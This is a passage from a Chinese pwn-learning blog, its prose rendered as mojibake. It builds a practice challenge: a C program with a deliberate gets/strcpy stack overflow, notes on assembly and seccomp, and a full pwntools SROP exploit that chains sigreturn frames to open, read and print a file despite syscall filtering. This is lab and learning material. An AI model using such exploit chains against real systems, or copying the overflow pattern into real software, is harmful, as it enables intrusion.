è¸©å‘,æ”¹ä¸ºç”¨æˆ·è¾“å…¥123456789101112131415161718#include &lt;stdio.h&gt;    #include &lt;string.h&gt;    void evilfunction(char *input) &#123;        char buffer[512];        strcpy(buffer, input);    &#125;    int main(int argc, char **argv) &#123;        char input[580];    printf(&quot;welcome to here,please give me something&quot;);    gets(input);    evilfunction(input);    return 0;    &#125; 





SROPâ€‹		æœ¬æ¥å¯»æ€ç›´æ¥ç»™ä¸ª&#x2F;bin&#x2F;shä¼šç®€å•,åæ¥å‘ç°å¥½åƒå’ŒåŸé¢˜å·®ä¸å¤šâ€¦ç„¶åä¸å¦‚åŠ ä¸ªç³»ç»Ÿè°ƒç”¨é™åˆ¶(ä¸è¿‡å¥½åƒè¿‡æ»¤çš„ä¸å®Œå…¨,è¿˜æ˜¯èƒ½getshell?)
å¦‚ä½•ç›´æ¥å†™æ±‡ç¼–å‘¢ï¼Ÿ ï¼ˆä¹Ÿå¯ä»¥å†™ä¸€ç¯‡åˆ†æ
https://blog.csdn.net/qq_27816307/article/details/50995042
1234567891011121314151617section .data            ; æ•°æ®æ®µå£°æ˜        msg db &quot;Hello, world!&quot;, 0xA     ; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²        len equ $ - msg                 ; å­—ä¸²é•¿åº¦section .text            ; ä»£ç æ®µå£°æ˜global _start            ; æŒ‡å®šå…¥å£å‡½æ•°_start:                  ; åœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²mov eax, 4       ; ç³»ç»Ÿè°ƒç”¨å·(sys_write);man 2 write å¯ä»¥æŸ¥çœ‹writeç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½;writeå‡½æ•°åŸå‹ï¼š ssize_t write(int fd,const void *buf,size_t count);mov ebx, 1       ; å‚æ•°ä¸€ï¼šæ–‡ä»¶æè¿°ç¬¦(stdout)mov ecx, msg     ; å‚æ•°äºŒï¼šè¦æ˜¾ç¤ºçš„å­—ç¬¦ä¸²mov edx, len     ; å‚æ•°ä¸‰ï¼šå­—ç¬¦ä¸²é•¿åº¦int 0x80         ; è°ƒç”¨å†…æ ¸åŠŸèƒ½ã€‚è½¯ä¸­æ–­ï¼Œé™·å…¥å†…æ ¸mov eax, 1       ; ç³»ç»Ÿè°ƒç”¨å·(sys_exit)mov ebx, 0       ; å‚æ•°ä¸€ï¼šé€€å‡ºä»£ç int 0x80         ; è°ƒç”¨å†…æ ¸åŠŸèƒ½



nasm æ³¨æ„ç¼–è¯‘å¤šå°‘ä½çš„ï¼Œblogé‡Œé¢æ˜¯32çš„ï¼Œ64çš„è¯
nams -f elf64 hello.asm
ç”¨gccé“¾æ¥ä¹Ÿå¯ä»¥ï¼ˆæœ¬è´¨éƒ½ä¸€æ ·å§ï¼‰
gcc -o example example.o
ld -s -o hello hello.o
åæ±‡ç¼–çœ‹ä¸€ä¸‹
ç”¨seccmpç¦æ‰execveï¼Ÿ è¿˜æ˜¯å•¥
å…ˆå°è£…åˆ°cé‡Œé¢
12nasm -f elf64 hello.asmgcc -fno-stack-protector  -no-pie  -o myprogram 1.c hello.o




objdump -s -j .rodata your_binary_file æŸ¥çœ‹å­—ç¬¦ä¸²
seccomp
å…³äºæ–‡ä»¶æè¿°ç¬¦çš„è°ƒè¯•ï¼Œgdbä¸­å¦‚ä½•æŸ¥çœ‹å‘¢ï¼Ÿ  Linuxä¸­åˆå¦‚ä½•æŸ¥çœ‹å‘¢ï¼Ÿ
1.c:4:10: fatal error: seccomp.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®
sudo apt-get install libseccomp-dev
ç¼–è¯‘çš„æ—¶å€™éœ€è¦åŠ é€‰é¡¹  -lseccomp
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182root@ubuntu:/home/ubuntu/æ¡Œé¢/pwn/8æœˆ/srop/test1# cat exp.pyfrom pwn import *small = ELF(&#x27;./test&#x27;)if args[&#x27;REMOTE&#x27;]:    sh = remote(&#x27;127.0.0.1&#x27;, 7777)else:    sh = process(&#x27;./myprogram&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b 0x401000&quot;)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;syscall_ret = 0x000000000040112estart_addr = 0x0000000000401120payload = p64(start_addr) * 4sh.send(payload)pause()sh.send(&quot;\x23&quot;)stack_addr = u64(sh.recv()[16:24])log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr))sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0 sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + b&quot;a&quot;*8 + bytes(sigframe)sh.send(payload)sigreturn = p64(syscall_ret) + b&quot;x&quot;*7print(&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;)pause()sh.send(sigreturn)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_opensigframe.rdi = 0x402004 sigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + b&quot;a&quot;*8 + bytes(sigframe)sh.send(payload)sigreturn = p64(syscall_ret) + b&quot;x&quot;*7print(&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;)pause()sh.send(sigreturn)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 3 sigframe.rsi = stack_addr+0x200sigframe.rdx = 0x100sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + b&quot;a&quot;*8 + bytes(sigframe)sh.send(payload)sigreturn = p64(syscall_ret) + b&quot;x&quot;*7print(&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;)pause()sh.send(sigreturn)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_writesigframe.rdi = 1 sigframe.rsi = stack_addr+0x200sigframe.rdx = 0x100sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + b&quot;a&quot;*8 + bytes(sigframe)sh.send(payload)sigreturn = p64(syscall_ret) + b&quot;x&quot;*7print(&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;)pause()sh.send(sigreturn)sh.interactive()







ç™½åå•æ„Ÿè§‰å¤æ‚ç‚¹ï¼Œå¯ä»¥ç›´æ¥ä¸Šé»‘åå•
https://www.sec4.fun/2018/07/23/seccomp/
â€‹		
</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/#content-inner">9</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">å”ä»”æ©™</div><div class="author-info__description">å–œæ¬¢æ¢ç´¢ä¸–ç•Œ,åœ¨è¯»ç ”ç©¶ç”Ÿ,è®¡ç®—æœºçˆ±å¥½è€…çš„æˆé•¿è®°å½•</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">ä¼šè®°å½•è‡ªå·±çš„å­¦ä¹ ç»å†,ä»¥åŠä¸€äº›ç»å†,å¦‚æœæœ‰æƒ³æ³•æˆ–è€…ç–‘æƒ‘,æ¬¢è¿äº¤æµ!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwnå…¥é—¨-49-pwnableä¹‹seethefile"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-49-pwnableä¹‹seethefile"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwnå…¥é—¨-49-pwnableä¹‹seethefile">pwnå…¥é—¨-49-pwnableä¹‹seethefile</a><time datetime="2024-01-28T14:31:00.000Z" title="å‘è¡¨äº 2024-01-28 22:31:00">2024-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwnå…¥é—¨-48-setcontextåº”ç”¨"><img src="/img/background/7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-48-setcontextåº”ç”¨"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwnå…¥é—¨-48-setcontextåº”ç”¨">pwnå…¥é—¨-48-setcontextåº”ç”¨</a><time datetime="2024-01-27T15:28:41.000Z" title="å‘è¡¨äº 2024-01-27 23:28:41">2024-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf"><img src="/img/background/3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf">pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf</a><time datetime="2023-11-12T15:40:29.000Z" title="å‘è¡¨äº 2023-11-12 23:40:29">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£"><img src="/img/background/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£">cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£</a><time datetime="2023-11-12T07:29:52.000Z" title="å‘è¡¨äº 2023-11-12 15:29:52">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwnå…¥é—¨-46-glibcæºç è°ƒè¯•"><img src="/img/background/3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-46-glibcæºç è°ƒè¯•"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwnå…¥é—¨-46-glibcæºç è°ƒè¯•">pwnå…¥é—¨-46-glibcæºç è°ƒè¯•</a><time datetime="2023-11-06T13:01:36.000Z" title="å‘è¡¨äº 2023-11-06 21:01:36">2023-11-06</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>åˆ†ç±»</span>
            <a class="card-more-btn" href="/categories/" title="æŸ¥çœ‹æ›´å¤š">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">53</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">è™šæ‹ŸåŒ–</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">è°ƒè¯•</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">æ¼æ´å¤ç°</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">ç”Ÿæ´»</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">ç§‘ç ”(å¹¶æ²¡æœ‰)</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>æ ‡ç­¾</span></div><div class="card-tag-cloud"><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(10, 4, 101)">æ—…æ¸¸</a><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(128, 24, 51)">è·¯ç”±å™¨</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(62, 19, 144)">csapp</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(183, 32, 92)">æµè§ˆå™¨å®‰å…¨</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(40, 25, 68)">Cè¯­è¨€</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(157, 135, 72)">PWNå…¥é—¨</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(129, 90, 79)">å †</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(143, 11, 56)">docker</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(68, 153, 52)">è„šæœ¬</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(167, 164, 68)">ç ”ç©¶ç”Ÿè¯¾ç¨‹</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(133, 16, 163)">è¯—æ­Œ</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(166, 200, 5)">è°ƒè¯•</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(125, 62, 162)">è®ºæ–‡</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(134, 119, 79)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(102, 57, 5)">USENIX</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>å½’æ¡£</span><a class="card-more-btn" href="/archives/" title="æŸ¥çœ‹æ›´å¤š">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">ä¸€æœˆ 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">åä¸€æœˆ 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">åæœˆ 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">ä¹æœˆ 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">å…«æœˆ 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">ä¸ƒæœˆ 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">å…­æœˆ 2023</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">äº”æœˆ 2023</span><span class="card-archive-list-count">7</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>ç½‘ç«™èµ„è®¯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">æ–‡ç« æ•°ç›® :</div><div class="item-count">82</div></div><div class="webinfo-item"><div class="item-name">å·²è¿è¡Œæ—¶é—´ :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ¬ç«™è®¿å®¢æ•° :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ¬ç«™æ€»è®¿é—®é‡ :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ€åæ›´æ–°æ—¶é—´ :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-28T15:27:55.798Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By å”ä»”æ©™</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["åº”çŸ¥å­¦é—®éš¾ï¼Œåœ¨ä¹ç‚¹æ»´å‹¤ã€‚å°¤å…¶éš¾ä¸Šéš¾ï¼Œé”»ç‚¼å“å¾·çº¯ã€‚","å‹¤èƒ½è¡¥æ‹™,å¤©é“é…¬å‹¤"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = 'åº”çŸ¥å­¦é—®éš¾ï¼Œåœ¨ä¹ç‚¹æ»´å‹¤ã€‚å°¤å…¶éš¾ä¸Šéš¾ï¼Œé”»ç‚¼å“å¾·çº¯ã€‚'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>